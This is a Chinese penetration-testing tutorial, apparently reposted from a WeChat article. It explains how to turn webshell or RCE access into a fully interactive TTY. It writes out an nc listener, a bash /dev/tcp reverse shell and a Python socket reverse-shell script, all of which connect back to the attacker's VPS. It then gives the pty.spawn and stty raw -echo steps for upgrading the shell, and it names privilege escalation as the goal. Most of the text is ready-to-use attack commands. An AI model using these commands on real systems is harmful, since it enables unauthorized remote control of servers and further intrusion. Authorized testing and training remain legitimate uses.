# 用python和stty升级shell为完全交互式tty

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI4Njk5NjY4OQ==&mid=2247485946&idx=1&sn=c2f610f56f0f862c3e4372fa6d76d54a&chksm=ebd52844dca2a152584f85ca06f31483303ff151542f4a62095089e3b30140704a75b61c03f3&scene=126&sessionid=1681654080#rd](http://mp.weixin.qq.com/s?__biz=MzI4Njk5NjY4OQ==&mid=2247485946&idx=1&sn=c2f610f56f0f862c3e4372fa6d76d54a&chksm=ebd52844dca2a152584f85ca06f31483303ff151542f4a62095089e3b30140704a75b61c03f3&scene=126&sessionid=1681654080#rd)

******![](../Images/d1da2e554dbf8fcb9ab1a544d6470ea8.png)********0x00 前言**在渗透测试中，我们通过漏洞上传了webshell或者直接通过rce执行系统命令。这时由于**http协议的无状态属性**，执行的上一条和下一条命令无法建立关联。  
这会导致我们无法执行一些交互式命令如vim，su等，没办法进行提权操作，也不能控制进程状态和补全命令，非常不方便。本文将介绍如何**通过python和stty获取一个完全交互式的tty**以解决这些问题。  
为什么用python呢，因为linux服务器上基本都会自带python环境。至于windows嘛，直接上线cs就好了。  
**0x01 反弹shell**首先我们要尝试摆脱http协议的限制：通过webshell或rce执行一个反弹shell的命令到我们的vps上，具体操作步骤如下：  
（1）先在你自己的vps上用**nc监听**，注意防火墙和安全组的设置，需要**放行监听的端口**。（云厂商的安全组、本机防火墙firewalld、管理面板如宝塔防火墙……），可以用telnet来确认一下是否放行成功。  

*   

```
`nc -lvp 端口`
```

![](../Images/0d14ff203ea2d6d1a65f99902acbcf2a.png)（2）在目标服务器上执行反弹shell，具体的执行命令，可以直接用**bash反弹**：  

*   

```
`bash -i >& /dev/tcp/你的vps的ip/监听端口 0>&1`
```

![](../Images/a0d8801ba0e1aba49a8671e4ec0b80e0.png)也可以用**python脚本反弹**，保存代码到目标服务器上，用python运行（也可能是python2或python3），注意文件命名不要命名成re.py或者subprocess.py，可能会有模块冲突的错误。  

*   
*   
*   
*   
*   
*   
*   

```
`import socket,subprocess,os``s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)``s.connect(("你的vps的ip",端口))``os.dup2(s.fileno(),0)       ``os.dup2(s.fileno(),1)       ``os.dup2(s.fileno(),2)       ``p=subprocess.call(["/bin/sh","-i"])`
```

![](../Images/1be59d36df8a2b6086c037362a7fa4ac.png)其实反弹shell的方法还有很多，不过根据我的实战经验来看这两种已经能应对大部分情况了。  
  
（3）成功后你在vps上会进入到目标主机反弹回来的shell中，可以直接执行命令。![](../Images/258c812ad3d071e838452f3b34cbd411.png)现在这个反弹回来的shell仍然不算是交互式的shell，业内称为是**简陋的哑shell**。  
哑shell用ctrl-c会直接中断会话，没有语法高亮，不能查看错误输出，虽然可以执行交互式命令和命令补全，但是界面显示会很蛋疼。以上原因导致有必要再继续升级成完全交互式shell。  
**0x02 升级成完全交互式shell**（1）首先在你的vps上反弹回来的shell中执行（注意目标服务器上的python版本）：

*   

```
`python -c 'import pty; pty.spawn("/bin/bash")'`
```

![](../Images/2f41955434fc8bee8352a2bc5142dd7c.png)（2）然后**ctrl-z挂起**，回到了vps的操作界面。![](../Images/17d07a59ab66f0b0777498ff59b7c907.png)（3）再执行这两条命令，注意一定要**用分号放在一起执行**，如果按照网上的很多旧教程分开执行的话，可能会有无法输入回车的bug影响使用。  

*   

```
`stty raw -echo;fg`
```

![](../Images/ced33aa945ffcd2c5b7cc0143e03c3b3.png)（4）现在回到了反弹的shell中，界面会有些怪异。执行一下reset命令恢复  

*   

```
`reset`
```

![](../Images/d9b76cf4f81a43f5ab6a8417947f0c00.png)（5）现在的shell就是一个完全交互式的shell了，可以使用ctrl-c，有语法高亮![](../Images/b7bac26f1db51c76bff72ed92954c7a3.png)可以用tab命令补全，执行交互式命令也很顺畅。  
![](../Images/62cd35cd0f8fb7beb46e06c389eaba0d.png)
